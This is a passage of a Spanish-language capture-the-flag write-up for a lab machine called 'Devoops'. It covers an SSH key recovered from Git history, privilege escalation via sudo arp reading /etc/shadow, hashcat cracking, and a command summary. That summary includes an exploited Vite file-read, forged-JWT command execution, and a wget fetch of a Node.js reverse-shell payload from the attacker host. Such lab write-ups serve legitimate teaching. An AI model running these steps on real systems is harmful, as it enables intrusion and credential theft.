- `grep -A 5 "hana"`: busca la cadena `hana` y además muestra 5 líneas posteriores (`-A 5` = after 5).

### 22.2. ¿Para qué sirvió?

Sirvió para localizar referencias útiles dentro de la base de datos, entre ellas identificadores de commits como:

- `1994a70bbd080c633ac85a339fd85a8635c63893` con mensaje `del: oops!`
- `02c0f912f6e5b09616580d960f3e5ee33b06084a` con mensaje `init: init commit`

Eso ya sugería que el repositorio podía contener material interesante en commits antiguos.

---

## 23. Lectura de commits directamente con Git

Se usó este comando:

```bash
GIT_DIR=/opt/gitea/git/hana/node.git git -c safe.directory=/opt/gitea/git/hana/node.git show 02c0f912f6e5b09616580d960f3e5ee33b06084a
```

### 23.1. Explicación completa

#### `GIT_DIR=/opt/gitea/git/hana/node.git`

Define la variable de entorno `GIT_DIR`, diciéndole a Git dónde está el repositorio. Esto permite trabajar sobre un repo sin tener que hacer `cd` dentro de él.

#### `git`

Invoca Git.

#### `-c safe.directory=...`

Git incorpora medidas de seguridad para no confiar automáticamente en repositorios propiedad de otros usuarios. Como aquí estamos accediendo a un repo de otro usuario/servicio (`gitea`), esta opción fuerza a Git a considerarlo directorio seguro.

#### `show <commit>`

Muestra el commit indicado:

- metadatos,
- mensaje,
- diff,
- líneas añadidas y quitadas.

### 23.2. ¿Qué se buscaba aquí?

Se buscaban secretos metidos por error en algún commit anterior, aunque luego se hubieran eliminado del código actual.

### 23.3. Filtrado del diff

Se filtró buscando líneas añadidas que parecieran parte de una clave privada:

```bash
GIT_DIR=/opt/gitea/git/hana/node.git git -c safe.directory=/opt/gitea/git/hana/node.git show 02c0f912f6e5b09616580d960f3e5ee33b06084a | grep "+---"
```

Y eso devolvió indicios de una clave OpenSSH:

```text
+-----BEGIN OPENSSH PRIVATE KEY-----
+-----END OPENSSH PRIVATE KEY-----
```

Eso ya era una prueba clarísima de que una clave privada había sido subida al repositorio en algún momento.

---

## 24. Reconstrucción de la clave privada de `hana`

Del diff se extrajo la clave completa, pero con un detalle:

en Git diff las líneas añadidas aparecen precedidas por `+`.

Por eso se guardó primero en un fichero temporal y luego se limpió con `sed`.

### 24.1. Limpieza con `sed`

```bash
sed 's/^+//' id_rsa
```

#### ¿Qué hace exactamente?

- `sed`: stream editor, sirve para transformar texto.
- `'s/^+//'`: instrucción de sustitución.
  - `s`: substitute.
  - `^+`: busca un signo `+` al principio de cada línea.
  - `//`: lo reemplaza por nada.

Es decir, elimina el `+` inicial de todas las líneas del diff y reconstruye el contenido real de la clave.

### 24.2. Error inicial con permisos inseguros

Se intentó usar la clave así y SSH respondió:

```text
WARNING: UNPROTECTED PRIVATE KEY FILE!
Permissions 0755 for 'id_rsa' are too open.
```

### 24.3. ¿Por qué SSH se queja de eso?

Porque una clave privada debe estar protegida. Si otros usuarios del sistema pudieran leerla, dejaría de ser “privada”. OpenSSH es estricto con eso.

### 24.4. Permisos correctos

Se corrigió con:

```bash
chmod 600 id_rsa
```

#### ¿Qué significa `600`?

- propietario: lectura y escritura
- grupo: nada
- otros: nada

Eso satisface la exigencia de SSH.

---

## 25. Acceso por SSH como `hana`

Se usó:

```bash
ssh -i id_rsa -o StrictHostKeyChecking=no hana@localhost
```

### 25.1. Explicación detallada

- `ssh`: cliente SSH.
- `-i id_rsa`: indica que use esa clave privada para autenticarse.
- `-o StrictHostKeyChecking=no`: desactiva la comprobación estricta de la clave del host. Esto evita que SSH pregunte confirmación interactiva al conectar por primera vez.
- `hana@localhost`: se conecta al servicio SSH local de la propia máquina como el usuario `hana`.

### 25.2. ¿Por qué `localhost`?

Porque ya estabas **dentro de la máquina** a través de la reverse shell de `runner`. Así que no hace falta salir y reconectar desde fuera; simplemente usas el servicio SSH local para pivotar internamente a otro usuario.

### 25.3. Resultado

Se consiguió sesión como:

```bash
whoami
hana
```

Y se obtuvo la `user.flag`.

---

## 26. Enumeración de privilegios con `sudo -l`

Ya como `hana`, el siguiente paso correcto era:

```bash
sudo -l
```

### 26.1. ¿Por qué se hace esto?

Porque `sudo -l` muestra qué comandos puede ejecutar el usuario actual con privilegios elevados. Es uno de los chequeos más importantes de post-explotación en Linux.

### 26.2. Resultado

Apareció:

```text
(root) NOPASSWD: /sbin/arp
```

### 26.3. ¿Qué significa exactamente?

- `root`: ese comando puede ejecutarse como root.
- `NOPASSWD`: no hace falta introducir contraseña.
- `/sbin/arp`: el binario permitido es ese concretamente.

Esto ya es una vía de escalada potencial.

---

## 27. Uso de GTFOBins para evaluar el binario permitido

Se consultó **GTFOBins** para `arp`.

### 27.1. ¿Qué es GTFOBins?

Es una base de datos de binarios legítimos de Unix/Linux que pueden abusarse para:

- escalada de privilegios,
- bypass de restricciones,
- lectura/escritura de archivos,
- ejecución de comandos,
- shells.

Es muy útil cuando `sudo -l` te muestra un binario aparentemente inocente y quieres saber si se puede convertir en una primitive ofensiva.

### 27.2. Técnica útil para `arp`

GTFOBins indicaba que `arp` podía leer desde un fichero usando:

```bash
arp -v -f /path/to/input-file
```

### 27.3. Aplicación al caso

Se ejecutó:

```bash
sudo /sbin/arp -v -f /etc/shadow
```

Y eso permitió leer `/etc/shadow` como root.

---

## 28. Importancia de `/etc/shadow`

`/etc/shadow` almacena los hashes de contraseña de los usuarios locales.

A diferencia de `/etc/passwd`, este archivo sí es sensible y solo root puede leerlo normalmente.

Dentro apareció una entrada de `root` como esta:

```text
root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.
```

### 28.1. ¿Qué significa `$6$`?

Ese prefijo identifica el algoritmo usado en el hash. En sistemas Unix/Linux, `$6$` corresponde a **SHA-512 crypt**.

---

## 29. Crackeo del hash con Hashcat

Se copió el hash a un fichero, por ejemplo `root_hash`, y luego se usó Hashcat.

### 29.1. ¿Qué es Hashcat?

Hashcat es una herramienta de cracking de hashes muy utilizada. Permite:

- probar diccionarios,
- reglas,
- combinaciones,
- ataques híbridos,
- GPU cuando está disponible.

### 29.2. Identificación del modo

Consultando la wiki de Hashcat se ve que el modo para `$6$` es:

```text
1800 = sha512crypt / SHA512 (Unix)
```

### 29.3. Comando usado

```bash
hashcat -a 0 -m 1800 root_hash /usr/share/wordlists/rockyou.txt
```

### 29.4. Explicación de las flags

- `-a 0`: ataque de diccionario directo.
- `-m 1800`: modo del hash, en este caso `sha512crypt`.
- `root_hash`: archivo que contiene el hash.
- `/usr/share/wordlists/rockyou.txt`: diccionario muy conocido, usado muchísimo en laboratorios.

### 29.5. Resultado

La contraseña resultó ser:

```text
eris
```

---

## 30. Compromiso final de `root`

Ya con la contraseña de root, se hizo:

```bash
su root
```

Y tras introducir `eris`, se obtuvo shell como `root`.

### 30.1. ¿Por qué funciona `su root`?

`su` permite cambiar de usuario. Si conoces la contraseña del usuario destino, puedes convertir tu sesión actual en una sesión de ese usuario. En este caso, `root`.

---

## 31. Flags y secretos finales encontrados

Como `root` se encontraron notas internas del autor de la máquina, donde se veían varias pistas y equivalencias:

- credenciales SSH,
- secreto JWT,
- transformación de la user flag,
- y derivación de la root flag.

La flag final era:

```text
flag{a834296543f4c2990909ce1c56becfba}
```

Y se validó correctamente en la página.

![Imagen 7 - Flag enviada correctamente](./files/imagen7_flag_submit.png)

---

## 32. Resumen técnico de la cadena de ataque

La cadena completa, de forma resumida pero clara, fue esta:

1. La máquina víctima se desplegó en VirtualBox y Kali en VMware, ambas en **modo puente** sobre la misma NIC física.
2. Se descubrió la IP de la víctima por escaneo de red y por el prefijo MAC de VirtualBox.
3. Nmap reveló un servicio web en el puerto 3000 asociado a **Vite**.
4. Se hizo fuzzing y se localizaron `/sign`, `/server` y `/execute`.
5. Se identificó una vulnerabilidad de **lectura arbitraria de archivos** en Vite.
6. Se leyó `.env` y se obtuvo el `JWT_SECRET` y la blacklist de comandos.
7. Se tomó el JWT de invitado y se forjó un JWT con `role=admin`.
8. Se envió el token en `Authorization: Bearer ...` al endpoint `/execute`.
9. Se confirmó **RCE** ejecutando `id` como el usuario `runner`.
10. Se subió y ejecutó una reverse shell en Node.js para obtener shell interactiva.
11. Se exploró Gitea y se localizó un repo Git del usuario `hana`.
12. Del historial de commits se extrajo una **clave privada SSH**.
13. Con esa clave se pivotó por SSH al usuario `hana`.
14. `sudo -l` mostró permiso `NOPASSWD` sobre `/sbin/arp`.
15. Con `arp -v -f /etc/shadow` se leyó el hash de root.
16. El hash se crackeó con Hashcat usando modo `1800`.
17. Se hizo `su root` con la contraseña descubierta.
18. Se obtuvo la `root.flag`.

---

## 33. Conceptos clave aprendidos en esta máquina

Esta máquina enseña muy bien varias ideas que merece la pena fijar:

### 33.1. Bridge no es lo mismo que NAT

En NAT, la VM suele quedar detrás del hipervisor.

En bridge, la VM aparece como un equipo más de la red física real.

### 33.2. El prefijo MAC puede identificar fabricantes

Saber leer un OUI te ayuda a distinguir rápidamente:

- VMs de VirtualBox,
- VMs de VMware,
- routers,
- dispositivos reales.

### 33.3. Un entorno de desarrollo expuesto puede ser gravísimo

Vite no debería quedar expuesto sin control. Un servidor de desarrollo visible en red es una superficie de ataque enorme.

### 33.4. Un `.env` expuesto suele ser crítico

No hace falta RCE inmediata si puedes leer secretos como:

- JWT secrets,
- API keys,
- contraseñas,
- tokens de sesión.

### 33.5. JWT mal diseñado = privilegios falsificables

Si el backend confía ciegamente en un `role` firmado con un secreto comprometido, el atacante puede convertirse en administrador.

### 33.6. Las blacklists de comandos son frágiles

Filtrar cadenas de texto rara vez basta para impedir explotación real.

### 33.7. Git guarda historia, no solo estado actual

Borrar un secreto del código **no lo elimina del histórico**. Los commits antiguos siguen siendo valiosísimos para un atacante.

### 33.8. `sudo -l` siempre es obligatorio en post-explotación

Muchísimas escaladas salen de ahí.

### 33.9. Binarios aparentemente inocentes pueden ser peligrosos

`arp` no parece una herramienta de escalada, pero con GTFOBins se ve que sí puede aprovecharse.

---

## 34. Comandos relevantes usados en el laboratorio

### Descubrimiento de hosts

```bash
sudo nmap -n -sn 192.168.1.42/24
```

### Escaneo completo de puertos

```bash
sudo nmap -p- --open -sCV -Pn -T5 -vvv -oN fullscan 192.168.1.41
```

### Fuzzing inicial

```bash
ffuf -u http://192.168.1.41:3000/FUZZ -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100 --fs 414
```

### Búsqueda de exploit

```bash
searchsploit vite
searchsploit -m multiple/remote/52111.py
```

### Lectura de `.env`

```text
http://192.168.1.41:3000/.env?raw??
```

### Comprobación de RCE

```bash
curl -H "Authorization: Bearer <JWT_ADMIN>" "http://192.168.1.41:3000/execute?cmd=id"
```

### Servidor HTTP en Kali

```bash
python3 -m http.server 80
```

### Descarga remota del payload

```bash
curl -H "Authorization: Bearer <JWT_ADMIN>" "http://192.168.1.41:3000/execute?cmd=wget+http://192.168.1.42:80/shell.js+-O+/tmp/shell.js"
```

### Ejecución del payload

```bash
curl -H "Authorization: Bearer <JWT_ADMIN>" "http://192.168.1.41:3000/execute?cmd=node+/tmp/shell.js"
```

### Investigación de la base de datos de Gitea

```bash
strings gitea.db | grep -A 5 "hana"
```

### Lectura de commit Git

```bash
GIT_DIR=/opt/gitea/git/hana/node.git git -c safe.directory=/opt/gitea/git/hana/node.git show 02c0f912f6e5b09616580d960f3e5ee33b06084a
```

### Limpieza de la clave privada

```bash
sed 's/^+//' id_rsa
chmod 600 id_rsa
```

### Pivoting por SSH

```bash
ssh -i id_rsa -o StrictHostKeyChecking=no hana@localhost
```

### Enumeración sudo

```bash
sudo -l
```

### Lectura de shadow como root mediante arp

```bash
sudo /sbin/arp -v -f /etc/shadow
```

### Crackeo del hash

```bash
hashcat -a 0 -m 1800 root_hash /usr/share/wordlists/rockyou.txt
```

### Elevación final

```bash
su root
```

---

## 35. Cierre

Devoops es una máquina muy buena para aprender una cadena realista de compromiso basada en:

- un mal despliegue de red,
- un servidor de desarrollo expuesto,
- una vulnerabilidad de lectura arbitraria,
- mala gestión de secretos,
- control de acceso roto mediante JWT,
- ejecución remota de comandos,
- pivoting por secretos en Git,
- y escalada local por `sudo` mal delegado.

Lo más valioso de esta máquina no es una técnica aislada, sino cómo una pequeña filtración inicial, en este caso un `.env`, termina desencadenando el compromiso total del sistema.

